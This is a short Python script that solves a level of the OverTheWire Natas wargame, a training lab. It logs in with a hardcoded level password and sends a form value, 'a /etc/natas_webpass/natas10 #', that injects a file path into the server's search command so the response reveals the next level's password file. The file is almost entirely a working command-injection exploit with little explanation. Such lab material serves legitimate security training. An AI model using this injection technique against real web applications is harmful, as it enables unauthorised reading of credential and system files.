import re
import requests

level = 9
creds = ('natas9','W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level
#/etc/natas_webpass/natas8
session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

formdata = {'needle':'a /etc/natas_webpass/natas10 #','submit':'submit'}
response = session.post(url,auth=creds,data=formdata)
data = response.text

print(re.findall('<pre>\n(.*)\n</pre>',data))